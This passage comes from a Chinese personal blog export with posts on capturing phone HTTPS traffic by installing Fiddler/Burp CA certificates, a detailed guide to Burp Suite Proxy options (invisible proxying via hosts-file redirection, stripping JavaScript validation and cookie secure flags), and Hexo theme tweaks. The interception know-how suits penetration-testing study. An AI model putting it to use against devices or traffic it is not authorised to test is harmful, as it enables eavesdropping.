<h3 id="下载证书并导入手机，（手机中只能导入-cer的证书。）"><a href="#下载证书并导入手机，（手机中只能导入-cer的证书。）" class="headerlink" title="下载证书并导入手机，（手机中只能导入.cer的证书。）"></a>下载证书并导入手机，（手机中只能导入.cer的证书。）</h3><img src="ca.png" width="500px;" height="200px;" title="电脑截图." alt="截图."/>
<img src="aca.jpg" width="200px;" height="300px;" title="手机截图." alt="手机截图."/>
<img src="acaa.jpg" width="200px;" height="300px;" title="手机截图." alt="手机截图."/>
<img src="acok.jpg" width="200px;" height="300px;" title="手机截图." alt="手机截图."/>


<h3 id="这时候就可以看到https了，但有的数据包好像抓不到。"><a href="#这时候就可以看到https了，但有的数据包好像抓不到。" class="headerlink" title="这时候就可以看到https了，但有的数据包好像抓不到。"></a>这时候就可以看到https了，但有的数据包好像抓不到。</h3><p><img src="https.png" alt=""></p>
<h2 id="这时候又看到新姿势-⑅oᴗo-۶"><a href="#这时候又看到新姿势-⑅oᴗo-۶" class="headerlink" title="这时候又看到新姿势(⑅ōᴗō)۶"></a>这时候又看到新姿势(⑅ōᴗō)۶</h2><p>用fiddler抓包转发到burp。于是又用fiddler试试</p>
<h3 id="设置fiddler代理-转发"><a href="#设置fiddler代理-转发" class="headerlink" title="设置fiddler代理 转发"></a>设置fiddler代理 转发</h3><p><img src="fidder1.png" alt=""><br><img src="fiddler2.png" alt=""><br><img src="fiddler3.png" alt=""></p>
<h3 id="转发"><a href="#转发" class="headerlink" title="转发"></a>转发</h3><p>fiddler默认代理是8888，这里转发到burp的8080端口<br><img src="fiddler4.png" alt=""></p>
<h3 id="在手机上也安装fiddler的证书，设置代理是一样的"><a href="#在手机上也安装fiddler的证书，设置代理是一样的" class="headerlink" title="在手机上也安装fiddler的证书，设置代理是一样的"></a>在手机上也安装fiddler的证书，设置代理是一样的</h3><p>然后Android手机的浏览器打开：<code>http://192.168.1.220:8888</code>下载安装证书<br><img src="fdca.jpg" alt=""></p>
<h3 id="打开burp再试试也差不多？"><a href="#打开burp再试试也差不多？" class="headerlink" title="打开burp再试试也差不多？"></a>打开burp再试试也差不多？</h3><p><img src="fdburp.png" alt=""><br>就是这个，证书的安全问题就没搞定只能忽略了<br><img src="unsafe.png" alt=""><br><a href="https://kb.cnblogs.com/page/130367/" target="_blank" rel="noopener">贴个标签：fiddler教程</a></p>
<h2 id="这里好像还有更好的"><a href="#这里好像还有更好的" class="headerlink" title="这里好像还有更好的"></a>这里好像还有更好的</h2><p><a href="https://www.t00ls.net/articles-51070.html" target="_blank" rel="noopener">HTTPDecrypt for Android Penetration Test</a></p>
]]></content>
      <categories>
        <category>brup</category>
      </categories>
      <tags>
        <tag>Burpsuit</tag>
      </tags>
  </entry>
  <entry>
    <title>安装/卸载CA证书</title>
    <url>/2020/03/26/%E5%AE%89%E8%A3%85-%E5%8D%B8%E8%BD%BDCA%E8%AF%81%E4%B9%A6/</url>
    <content><![CDATA[<h2 id="CA证书的安装"><a href="#CA证书的安装" class="headerlink" title="CA证书的安装"></a>CA证书的安装</h2><p>以管理员身份，启动IE浏览器，在地址栏输入<code>http://burp</code>并回车，进入证书下载页面</p>
<a id="more"></a>
<img src="/2020/03/26/%E5%AE%89%E8%A3%85-%E5%8D%B8%E8%BD%BDCA%E8%AF%81%E4%B9%A6/ca.png" class="" title="This is an image">
<p><img src="ca.png" alt=""><br>下载，导入浏览器~</p>
]]></content>
      <categories>
        <category>brup</category>
      </categories>
      <tags>
        <tag>Burpsuit</tag>
      </tags>
  </entry>
  <entry>
    <title>Burpsuit基本使用</title>
    <url>/2020/03/25/Burpsuit%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h2><p>当Burp Suite拦截的客户端和服务器交互之后，消息分析选项的主要四项:</p>
<a id="more"></a>
<p><strong><strong>Raw</strong></strong><br>&emsp;这视图主要显示web请求的raw格式，包含请求地址、http协议版本、主机头、浏览器信息、Accept可接受的内容类型、字符集、编码方式、cookie等。可以通过手工修改这些信息，对服务器端进行渗透测试。<br><strong><strong>Params</strong></strong><br>&emsp;这个视图主要显示客户端请求的参数信息、包括GET或者POST请求的参数、Cookie参数。渗透人员可以通过修改这些请求参数来完成对服务器端的渗透测试。<br><strong><strong>Headers</strong></strong><br>&emsp;这个视图显示的信息和Raw的信息类似，只不过在这个视图中，展示得更直观、友好。<br><strong><strong>Hex</strong></strong><br>&emsp;这个视图显示Raw的二进制内容，你可以通过hex编辑器对请求的内容进行修改。&emsp;默认情况下，Burp Proxy只拦截请求的消息，普通文件请求如css、js、图片是不会被拦截的，你可以修改默认的拦截选项来拦截这些静态文件，当然，你也可以通过修改拦截的作用域、参数或者服务器端返回的关键字来控制Burp Proxy的消息拦截。 所有流经Burp Proxy的消息，都会在http history记录下来，我们可以通过历史选项卡，查看传输的数据内容，对交互的数据进行测试和验证。同时，对于拦截到的消息和历史消息，都可以通过右击弹出菜单，发送到Burp的其他组件，如Spider、Scanner、Repeater、Intruder、Sequencer、Decoder、Comparer、Extender，进行进一步的测试。</p>
<h2 id="数据拦截与控制"><a href="#数据拦截与控制" class="headerlink" title="数据拦截与控制"></a>数据拦截与控制</h2><p>&emsp;Burp Proxy的拦截功能主要由Intercept选项卡中的Forward、Drop、Interception is on/off、Action、Comment 以及Highlight构成，它们的功能分别是： Forward的功能是当你查看过消息或者重新编辑过消息之后，点击此按钮，将发送消息至服务器端。 Drop的功能是你想丢失当前拦截的消息，不再forward到服务器端。 Interception is on表示拦截功能打开，拦截所有通过Burp Proxy的请求数据；Interception is off表示拦截功能关闭，不再拦截通过Burp Proxy的所有请求数据。 Action的功能是除了将当前请求的消息传递到Spider、Scanner、Repeater、Intruder、Sequencer、Decoder、Comparer组件外，还可以做一些请求消息的修改，如改变GET或者POST请求方式、改变请求body的编码，同时也可以改变请求消息的拦截设置，如不再拦截此主机的消息、不再拦截此IP地址的消息、不再拦截此种文件类型的消息、不再拦截此目录的消息，也可以指定针对此消息拦截它的服务器端返回消息。Comment的功能是指对拦截的消息添加备注，在一次渗透测试中，你通常会遇到一连串的请求消息，为了便于区分关键请求的消息可以添加备注信息。Highlight的功能与Comment功能有点类似，即对当前拦截的消息设置高亮，以便于其他的请求消息相区分。除了Intercept中可以对通过Proxy的消息进行控制外，在可选项设置选项卡Options中也有很多的功能设置也可以对流经的消息进行控制和处理。</p>
<h2 id="选项配置Options"><a href="#选项配置Options" class="headerlink" title="选项配置Options"></a>选项配置Options</h2><p>&emsp;当我们打开可选项设置选项卡Options，从界面显示来看，主要包括以下几大板块<br><strong><strong>·</strong></strong> Proxy监听设置<br><strong><strong>·</strong></strong> 客户端请求消息拦截<br><strong><strong>·</strong></strong> 服务器端返回消息拦截<br><strong><strong>·</strong></strong> 服务器返回消息修改<br><strong><strong>·</strong></strong> 正则表达式配置<br><strong><strong>·</strong></strong> 其他配置项</p>
<h3 id="Proxy-监听设置"><a href="#Proxy-监听设置" class="headerlink" title="Proxy 监听设置"></a>Proxy 监听设置</h3><p>&emsp;启动Burp Suite时，默认会监听本地回路地址的8080端口。当我们在实际使用中，可能需要同时测试不同的应用程序时，我们可以通过设置不同的代理端口，来区分不同的应用程序，Proxy监听即提供这样的功能设置。点击图中的【Add】按钮，会弹出Proxy监听设置对话框，里面有更丰富的设置，满足我们不同的测试需求。<br>监听设置主要包含3块功能：<br><strong><strong>·</strong></strong> 端口和IP绑定设置Binding 绑定的端口port是指Burp Proxy代理服务监听的端口，绑定IP地址分<code>仅本地回路</code>、<code>所有接口</code>、<code>指定地址</code>三种模式，在渗透测试中，无论你选择哪种模式，你需要明白一点，当你选择的非本地回路IP地址时，同局域网内的其他电脑也可以访问你的监听地址。<br><strong><strong>·</strong></strong> 请求处理Request Handling 请求处理主要是用来控制接受到Burp Proxy监听端口的请求后，如何对请求进行处理的。 其具体配置可分为：端口的转发、主机名/域名的转发、强制使用SSL和隐形代理4个部分。当我们配置了端口的转发时，所有的请求都会被转发到这个端口上；如果我们配置了主机或域名的转发，则所有的请求会转发到指定的主机或域名上。同时，我们可以指定，通过Burp Proxy的消息是否强制使用SSL，如果设置了此项，则请求若是http协议，经Burp proxy代理后将转换为https协议。隐形代理主要是用于测试富客户端应用或者是非浏览器代理方式的应用，当我们设置了它,访问这些应用时，将通过非代理的方式，直接连接Burp Proxy的监听端口。<br><strong><strong>·</strong></strong> SSL 证书 这些设置控制呈现给SSL客户端的服务器SSL证书。可以解决使用拦截代理时出现的一些SSL问题： 1.您可以消除您的浏览器的SSL警报，并需要建立SSL例外。其中，网页加载来自其他域的SSL保护的项目，可以确保这些正确的加载到浏览器，而不需要为每个域手动接受代理的SSL证书。 2.可以与该拒绝无效的SSL证书连接到服务器胖客户机应用程序的工作。有下列选项可供设置：<br><strong><strong>·</strong></strong> 使用自签名证书（Use a self-signed certificate ） —— 一个简单的自签名SSL证书呈现给您的浏览器，它总是会导致SSL警告。<br><strong><strong>·</strong></strong> 生成每个主机的CA签名证书（Generate CA-signed per-host certificates）—— 这是默认选项。在安装时，Burp创造了一个独特的自签名的证书颁发机构（CA）证书，并将此计算机上使用。当你的浏览器发出的SSL连接指定主机，Burp生成该主机的SSL证书，由CA证书签名。您可以安装Burp的CA证书作为浏览器中的受信任的根，从而使每个主机证书没有任何警报接受。<br><strong><strong>·</strong></strong> 生成与特定的主机名CA签发的证书（Generate a CA-signed certificate with a specific hostname）—— -是类似于前面的选项;不同的是，Burp会生成一个主机证书与每一个SSL连接使用，使用指定的主机名。<br><strong><strong>·</strong></strong> 使用自定义证书（Use a custom certificate）—— 此选项可以加载一个特定的证书（在PKCS＃12格式）呈现给浏览器。如果应用程序使用这需要一个特定的服务器证书（例如，与给定的序列号或证书链）的客户端应该使用这个选项。</p>
<h3 id="TLS·SSL直连和隐形代理-TLS-Pass-Through"><a href="#TLS·SSL直连和隐形代理-TLS-Pass-Through" class="headerlink" title="TLS·SSL直连和隐形代理/TLS Pass Through"></a>TLS·SSL直连和隐形代理/TLS Pass Through</h3><p>&emsp;SSL直连的设置主要用于指定的目的服务器直接通过SSL连接，而通过这些连接的请求或响应任何细节将在Burp代理拦截视图或历史日志中可见。通过SSL连接传递可以并不是简单地消除在客户机上SSL错误的情况下有用。比如说，在执行SSL证书的移动应用。如果应用程序访问多个域，或使用HTTP和HTTPS连接的混合，然后通过SSL连接到特定的主机问题仍然使您能够以正常的方式使用Burp的其他方式进行通信。如果启用自动添加客户端SSL协商失败的选项，当客户端失败的SSL协议检测（例如，由于不承认Burp的CA证书），并会自动将相关的服务器添加到SSL直通通过列表中去。<br>有时候，在拦截富客户端软件时，我们通常需要使用隐形代理。富客户端软件通常是指运行在浏览器之外的客户端软件，这就意味着它本身不具有HTTP代理是属性。当它进行网络通信时，客户端将无法使代理感知或者无法由代理进行通信。在Burp中，我们可以使用隐形代理的方式，对通信内容进行代理或拦截，从而对通信的请求和响应消息进行分析。使用隐形代理通常需要做如下设置<code>（以https://example.com为例）</code>：<br>1.配置hosts文件，Windows操作系统下的目录位置<code>Windows/System32/drivers/etc/hosts</code>，而Linux或者Unix下的目录为<code>/etc/hosts</code>，添加下行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1 example.com</span><br></pre></td></tr></table></figure>
<p>2.第一步设置完成之后，我们需要添加一个新的监听来运行在HTTP默认的80端口，如果通信流量使用HTTPS协议，则端口为443。<br>3.如果是HTTPS协议的通信方式，我们需要一个指定域名的CA证书。<br>4.接着，我们需要把Burp拦截的流量转发给原始请求的服务器。这需要在Project options-&gt;Hostname Resolution 进行设置。因为我们已经告诉了操作系统，example.com的监听地址在127.0.0.1上，所以我们必须告诉Burp，将example.com的流量转发到真实的服务器那里去。<br>5.通过这样的配置，我们就可以欺骗富客户端软件，将流量发送到Burp监听的端口上，再由Burp将流量转发给真实的服务器。</p>
<h3 id="客户端请求消息拦截-Intercept-Client-Requests"><a href="#客户端请求消息拦截-Intercept-Client-Requests" class="headerlink" title="客户端请求消息拦截/Intercept Client Requests"></a>客户端请求消息拦截/Intercept Client Requests</h3><p>&emsp;客户端请求消息拦截是指拦截客户端发送到服务器端消息的相关配置选项,主要包含拦截规则配置、错误消息自动修复、自动更新Content-Length消息头三个部分。<br><strong><strong>拦截规则配置</strong></strong><br>&emsp;如果intercept request based on the follow rules的checkbox被选中，则拦截所有符合勾选按钮下方列表中的请求规则的消息都将被拦截，拦截时，对规则的过滤是自上而下进行的。当然，我们可以根据自己的需求，通过【Up】和【Down】按钮，调节规则所在位置和排序。同时，我们可以点击【Add】添加一条规则，也可以选中一条规则，通过点击【Edit】进行编辑、点击【Remove】进行删除。当我们点击【Add】按钮时，会弹出规则添加的输入对话框。拦截规则添加时，共包含4个输入项。Boolean opertor表示当前的规则与其他规则是与的方式（And）还是或的方式（Or）共存；Match type表示匹配类型，此处匹配类型可以基于域名、IP地址、协议、请求方法、URL、文件类型、参数, cookies, 头部或者内容, 状态码, MIME类型, HTML页面的title等。Match relationship表示此条规则是匹配还是不匹配Match condition输入的关键字。当我们输入这些信息，点击【OK】按钮，则规则即被保存。<br><strong><strong>错误消息自动修复</strong></strong><br>&emsp;如果Automatically fix missing的checkbox被选中，则表示在一次消息传输中，Burp Suite会自动修复丢失或多余的新行。比如说，一条被修改过的请求消息，如果丢失了头部结束的空行，Burp Suite会自动添加上；如果一次请求的消息体中，URl编码参数中包含任何新的换行，Burp Suite将会移除。此项功能在手工修改请求消息时，为了防止错误，有很好的保护效果。<br><strong><strong>自动更新Content-Length消息头</strong></strong><br>&emsp;如果Automatically update Content-Length的checkbox被选中，则当请求的消息被修改后，Content-Length消息头部也会自动被修改，替换为与之相对应的值。</p>
<h3 id="服务器端返回消息拦截-Intercept-Server-Responses"><a href="#服务器端返回消息拦截-Intercept-Server-Responses" class="headerlink" title="服务器端返回消息拦截/Intercept Server Responses"></a>服务器端返回消息拦截/Intercept Server Responses</h3><p>&emsp; 它的功能主要包含intercept response based on the follow rules和Automatically update Content-Length header when the response edited两个选项，其功能分别与客户端请求消息拦截中的intercept request based on the follow rules、Automatically update Content-Length header when the request edited相对应。</p>
<h3 id="web套接字消息-Intercept-WebSockets-Messages"><a href="#web套接字消息-Intercept-WebSockets-Messages" class="headerlink" title="web套接字消息/Intercept WebSockets Messages"></a>web套接字消息/Intercept WebSockets Messages</h3><p>勾选设置控制websocket消息停滞在intercept选项以进行浏览 编辑</p>
<h3 id="服务器返回消息修改-Response-Modification"><a href="#服务器返回消息修改-Response-Modification" class="headerlink" title="服务器返回消息修改/Response Modification"></a>服务器返回消息修改/Response Modification</h3><p>&emsp;服务器返回消息修改是指自动修改服务器端返回消息的相关设置项。自上而下，每一个选择项分别对应的功能是<br><strong><strong>·</strong></strong> 显示form表单中隐藏字段<br><strong><strong>·</strong></strong> 高亮显示form表单中隐藏字段<br><strong><strong>·</strong></strong> 使form表单中的disable字段生效，变成可输入域<br><strong><strong>·</strong></strong> 移除输入域长度限制<br><strong><strong>·</strong></strong> 移动JavaScript验证<br><strong><strong>·</strong></strong> 移动所有的JavaScript<br><strong><strong>·</strong></strong> 移除标签<br><strong><strong>·</strong></strong> 转换https超链接为http链接<br><strong><strong>·</strong></strong> 移除所有cookie中的安全标志<br>通过服务器返回消息修改可选择项的设置，以方便在安全评估过程中突破原有的数据限制，更好、更快地检测服务器端的安全性。</p>
<h3 id="正则表达式配置-Match-and-Replace"><a href="#正则表达式配置-Match-and-Replace" class="headerlink" title="正则表达式配置/Match and Replace"></a>正则表达式配置/Match and Replace</h3><p>&emsp;此项配置主要用来自动替换请求消息和服务器端返回消息中的某些值和文本，它与前文的规则的不同之处还在于支持正则表达式语言。当点击【Add】按钮时，在弹出的匹配或替换规则输入对话框中我们可以看到，它可以对请求和返回消息的消息头，消息体、请求参数名、请求参数值、请求的第一行进行匹配和替换。例如，<code>当我们要替换所有返回消息中的邮箱地址为t0data@burpsuite.com时</code>，可以参考下图的设置填写输入项并保存验证。</p>
<h3 id="其他配置项-Miscllaneous"><a href="#其他配置项-Miscllaneous" class="headerlink" title="其他配置项/Miscllaneous"></a>其他配置项/Miscllaneous</h3><p><strong><strong>其他配置项主要是杂项设置</strong></strong><br>&emsp;自上而下依次的功能是:<br><strong><strong>·</strong></strong> 指定使用HTTP/1.0协议与服务器进行通信 这项设置用于强制客户端采用HTTP/1.0协议与服务器进行通信，一般客户端使用的HTTP协议版本依赖于客户端浏览器，但某些服务器或者应用，必须使用HTTP/1.0协议，此时可勾选此项<br><strong><strong>·</strong></strong> 指定使用HTTP/1.0协议反馈消息给客户端 目前所有的浏览器均支持HTTP/1.0协议和HTTP/1.1协议，强制指定HTTP/1.0协议主要用于显示浏览器的某些方面的特征，比如，阻止HTTP管道攻击。<br><strong><strong>·</strong></strong> 设置返回消息头中的“Connection：close” 可用于某些情况下的阻止HTTP管道攻击。<br><strong><strong>·</strong></strong> 请求消息头中脱掉Proxy-* 浏览器请求消息中，通常会携带代理服务器的相关信息，此选项主要用于清除消息头中的代理服务器信息。<br><strong><strong>·</strong></strong> 解压请求消息中的压缩文件 某些应用在与服务器端进行交互时，会压缩消息体，勾选此选项，则Burp Suite 会自动解压消息体<br><strong><strong>·</strong></strong> 解压返回消息中的压缩文件 大多数浏览器支持压缩的消息体，勾选此选项，则Burp Suite 会自动解压被服务器端压缩的消息体<br><strong><strong>·</strong></strong> 禁用<a href="http://burp" target="_blank" rel="noopener">http://burp</a><br><strong><strong>·</strong></strong> 允许通过DNS和主机名访问web接口 即允许通过域名或主机名访问Burp Suite<br><strong><strong>·</strong></strong> 不在浏览器中显示Burp Suite错误 在我们使用Burp Suite时，如果发生了Burp Suite自身的错误，会在浏览器中显示，如果勾选了此项，则不会在浏览器中显示此类错误。<br><strong><strong>·</strong></strong> 禁用日志到历史和网站地图中 此选项的作用是阻止记录日志到历史和网站地图，在某些情况下可能有用，比如说，通过上游服务器进行认证或者做正则表达式替换时，为了降低内存的消耗，减少日志的储存，你可以勾选此项。<br><strong><strong>·</strong></strong> 拦截功能开始设置<br>这个选项主要用来配置intercept功能的生效方式，分为总是生效、 总是失效 、从上一次的Burp Suite中恢复设置3种方式。</p>
<h2 id="历史记录History"><a href="#历史记录History" class="headerlink" title="历史记录History"></a>历史记录History</h2><p>Burp Proxy的历史记录由HTTP历史和WebSockets历史两个部分组成。</p>
<h3 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h3><p>&emsp;HTTP历史界面由<code>筛选过滤器</code>、<code>历史记录列表</code>、<code>消息详情</code>3个部分组成。</p>
<h4 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h4><p>&emsp;当我们在做产品系统的安全评估过程中，会在HTTP历史中保存了大量的日志记录，为了更友好的消息管理，Burp提供了筛选过滤器功能。当我们点击HTTP历史标签下发的Filter时，将弹出筛选过滤器界面。按照过滤条件的不同，筛选过滤器划分出7个子板块</p>
<h5 id="按照请求类型过滤"><a href="#按照请求类型过滤" class="headerlink" title="按照请求类型过滤"></a>按照请求类型过滤</h5><p>你可以选择仅显示当前作用域的、仅显示有服务器端响应的和仅显示带有请求参数的消息。当你勾选“仅显示当前作用域”时，此作用域需要在Burp Target的Scope选项中进行配置，详细请阅读Burp Target相关章节。</p>
<h5 id="按照MIME类型过滤"><a href="#按照MIME类型过滤" class="headerlink" title="按照MIME类型过滤"></a>按照MIME类型过滤</h5><p>你可以控制是否显示服务器端返回的不同的文件类型的消息，比如只显示HTML、css或者图片。此过滤器目前支持HTML、Script、XML、CSS、其他文本、图片、Flash、二进制文件 8种形式。</p>
<h5 id="按照服务器返回的HTTP状态码过滤"><a href="#按照服务器返回的HTTP状态码过滤" class="headerlink" title="按照服务器返回的HTTP状态码过滤"></a>按照服务器返回的HTTP状态码过滤</h5><p>Burp根据服务器的状态码，按照2XX,3XX,4XX,5XX分别进行过滤。比如，如果你只想显示返回状态码为200的请求成功消息，则勾选2XX。</p>
<h5 id="按照查找条件过滤"><a href="#按照查找条件过滤" class="headerlink" title="按照查找条件过滤"></a>按照查找条件过滤</h5><p>此过滤器是针对服务器端返回的消息内容，与输入的关键字进行匹配，具体的匹配方式，你可以选择 1.正则表达式 2.大小写敏感 3.否定查找 3种方式的任何组合，前面两种匹配方式容易理解，第3种匹配方式是指与关键字匹配上的将不再显示。</p>
<h5 id="按照文件类型过滤"><a href="#按照文件类型过滤" class="headerlink" title="按照文件类型过滤"></a>按照文件类型过滤</h5><p>通过文件类型在过滤消息列表，这里有两个选择可供操作。一是仅仅显示哪些，另一个是不显示哪些。如果是仅仅显示哪些，在show only的输入框中填写显示的文件类型，同样，如果不显示哪些文件类型，只要在hide的输入框中填写不需要显示的文件类型即可。</p>
<h5 id="按照注解过滤"><a href="#按照注解过滤" class="headerlink" title="按照注解过滤"></a>按照注解过滤</h5><p>此过滤器的功能是指，根据每一个消息拦截时候的备注或者是否高亮来作为筛选条件控制哪些消息在历史列表中显示。</p>
<h5 id="按照监听端口过滤"><a href="#按照监听端口过滤" class="headerlink" title="按照监听端口过滤"></a>按照监听端口过滤</h5><p>此过滤器通常使用于当我们在Proxy Listeners中多个监听端口时，仅仅显示某个监听端口通信的消息，一般情况下，我们很少用到。</p>
<h4 id="历史消息列表"><a href="#历史消息列表" class="headerlink" title="历史消息列表"></a>历史消息列表</h4><p>其中主要包含请求序列号、请求协议和主机名、请求的方式、URL路径、请求参数、Cookie、是否用户编辑过消息、服务器端返回的HTTP状态码等信息。通过这些信息，我们可以对一次客户端与服务器端交互的HTTP消息详情做出准确的分析，同时，在下方的详情视图中，也提供基于正则表达式方式的匹配查找功能，更好的方便渗透测试人员查找消息体中的相关信息。</p>
<h4 id="消息详情"><a href="#消息详情" class="headerlink" title="消息详情"></a>消息详情</h4><p>当我们在某一条历史记录上单击，会在下方的消息详解块显示此条消息的文本详细信息。当我们在某条消息上双击，则会弹出此条消息的详细对话框。<br>以点击对话框右上方的【Previous】、【Next】按钮，浏览上一条或下一条消息的内容，也可以修改Raw的请求参数，然后执行多种【Action】操作。</p>
<h3 id="WebSockets"><a href="#WebSockets" class="headerlink" title="WebSockets"></a>WebSockets</h3><p>&emsp;从界面上我们可以看出，WebSockets历史所提供的功能和选项是HTTP历史的一个子集，只是因为采用的通信方式的不同，而被独立出来成为一个专门的视图。其功能的使用方式与HTTP历史雷同。</p>
<p>&emsp;学会基本使用就应该知道作为中间人的Burp Proxy在消息拦截过程中，可以对请求消息、应答消息做多方面的修改，并可以把消息传递给Burp的其他组件做进一步的测试。同时，Burp Proxy的历史日志功能和多种筛选过滤器让我们在使用中，能快速地查找需要的数据和关键信息，这些，都极大地提高了工作效率。</p>
]]></content>
      <categories>
        <category>brup</category>
      </categories>
      <tags>
        <tag>Burpsuit</tag>
      </tags>
  </entry>
  <entry>
    <title>跳过渲染</title>
    <url>/2020/03/23/%E8%B7%B3%E8%BF%87%E6%B8%B2%E6%9F%93/</url>
    <content><![CDATA[<p><code>_config.yml</code>有提供一个配置项skip_render来设置跳过渲染的文件跳过source目录下某个文件的渲染</p>
<a id="more"></a>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 跳过单个文件</span><br><span class="line">skip_render: test.html</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 跳过所有的html的文件</span><br><span class="line">skip_render: &#39;*.html&#39;</span><br></pre></td></tr></table></figure>
<p>跳过某个目录下的所有文件的渲染</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">skip_render: test&#x2F;*</span><br></pre></td></tr></table></figure>
<p>跳过某一目录下的所有文件和子目录的渲染</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">skip_render: test&#x2F;**</span><br></pre></td></tr></table></figure>
<p>跳过多个目录，或者多个文件的渲染</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">skip_render: [&#39;*.html&#39;, demos&#x2F;**, test&#x2F;*]</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>优化主题</title>
    <url>/2020/03/21/%E4%BC%98%E5%8C%96%E4%B8%BB%E9%A2%98/</url>
    <content><![CDATA[<p>配置优化这东西是真的浪费时间，<del>要不是我懒就该换个博客了</del></p>
<a id="more"></a>

<h3 id="hexo-init-xxx"><a href="#hexo-init-xxx" class="headerlink" title="hexo init /xxx"></a>hexo init /xxx</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo init D:&#x2F;521&#x2F;NEW</span><br></pre></td></tr></table></figure>
<p>调试： <code>hexo s --debug</code></p>
<h3 id="还是继续用next"><a href="#还是继续用next" class="headerlink" title="还是继续用next"></a>还是继续用next</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;theme-next&#x2F;hexo-theme-next themes&#x2F;next</span><br></pre></td></tr></table></figure>
<p>为什么挂代理还是这么慢……<br>没下载完先改一下<code># Hexo Configuration</code>基本信息<br>ctrl+c/ctrl+v,主题换成next再习惯性的删了原主题<br>把next切换到Gemini</p>
<h3 id="菜单栏："><a href="#菜单栏：" class="headerlink" title="菜单栏："></a>菜单栏：</h3><p>menu打开用到那几个，顺便加上友链<code>friendlink: /friendlink/ || link</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo new page &quot;schedule&quot;</span><br><span class="line">hexo new page &quot;about&quot;</span><br><span class="line">hexo new page &quot;tags&quot;</span><br></pre></td></tr></table></figure>
<h3 id="友链"><a href="#友链" class="headerlink" title="友链"></a>友链</h3><p>要增加友链页面的样式的没弄好，还是以后再改吧</p>
<h3 id="修改回到顶部"><a href="#修改回到顶部" class="headerlink" title="修改回到顶部"></a>修改回到顶部</h3><pre><code>back2top:
  enable: true
  # Back to top in sidebar.
  sidebar: true
  # Scroll percent label in b2t button.
  scrollpercent: true</code></pre><h3 id="社交链接"><a href="#社交链接" class="headerlink" title="社交链接"></a>社交链接</h3><pre><code># Social Links
# Usage: `Key: permalink || icon`
# Key is the link label showing to end users.
.......</code></pre><h3 id="头像"><a href="#头像" class="headerlink" title="头像"></a>头像</h3><pre><code>avatar:
  # Replace the default image and set the url here.
.......</code></pre><p>然后把图片扔进去</p>
<h3 id="圆角"><a href="#圆角" class="headerlink" title="圆角"></a>圆角</h3><p>hexo的source添加<code>_data/next.yml</code><br>添加圆角设置并在next配置取消<code>variables.styl</code>注释</p>
<pre><code>// 圆角设置
$border-radius-inner     = 20px 20px 20px 20px;
$border-radius           = 20px;</code></pre><p>原来的 <code>next/source/css/_custom/_custom.styl</code> 可以放在 <code>hexo/source/_data/styles.styl</code> </p>
<h3 id="半透明"><a href="#半透明" class="headerlink" title="半透明"></a>半透明</h3><p>在<code>hexo/source/_data/styles.styl</code>添加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;博客内容透明化</span><br><span class="line">&#x2F;&#x2F;文章内容的透明度设置</span><br><span class="line">.content-wrap &#123;</span><br><span class="line">  opacity: 0.9;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;侧边框的透明度设置</span><br><span class="line">.sidebar &#123;</span><br><span class="line">  opacity: 0.9;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;菜单栏的透明度设置</span><br><span class="line">.header-inner &#123;</span><br><span class="line">  background: rgba(255,255,255,0.9);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;搜索框（local-search）的透明度设置</span><br><span class="line">.popup &#123;</span><br><span class="line">  opacity: 0.9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="背景图"><a href="#背景图" class="headerlink" title="背景图"></a>背景图</h3><p>先把图片放进去<br>在<code>hexo/source/_data/styles.styl</code>添加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">body &#123;</span><br><span class="line">    background:url(&#x2F;images&#x2F;yourbackground.jpg);</span><br><span class="line">    background-repeat: no-repeat;</span><br><span class="line">    background-attachment:fixed; &#x2F;&#x2F;不重复</span><br><span class="line">    background-size: cover;      &#x2F;&#x2F;填充</span><br><span class="line">    background-position:50% 50%;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="还是加上分类吧，"><a href="#还是加上分类吧，" class="headerlink" title="还是加上分类吧，"></a>还是加上分类吧，</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo new page categories</span><br></pre></td></tr></table></figure>
<p>改一下md</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 文章分类</span><br><span class="line">date: 2020-03-20 13:47:40</span><br><span class="line">type: &quot;categories&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>用的时候和tag应该是一样的</p>
<h3 id="添加搜索"><a href="#添加搜索" class="headerlink" title="添加搜索"></a>添加搜索</h3><p>NexT 主题用Hexo的拓展包 <code>hexo-generator-searchdb</code>，预先生成了一个文本库 search.xml，然后传到了网站里面。在本地搜索的时候，NexT 直接用 javascript 调用了这个文件，从而实现了静态网站的本地搜索。~安装插件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>
<p>好了,显示<code>+ hexo-generator-searchdb@1.2.0</code><br>到next主配置打开search&gt;发现可以搜索了</p>
<h3 id="文末提醒"><a href="#文末提醒" class="headerlink" title="文末提醒"></a>文末提醒</h3><p>在<code>\themes\next\layout\_macro</code>中新建<code>passage-end-tag.swig</code>文件,复制下列代码：</p>
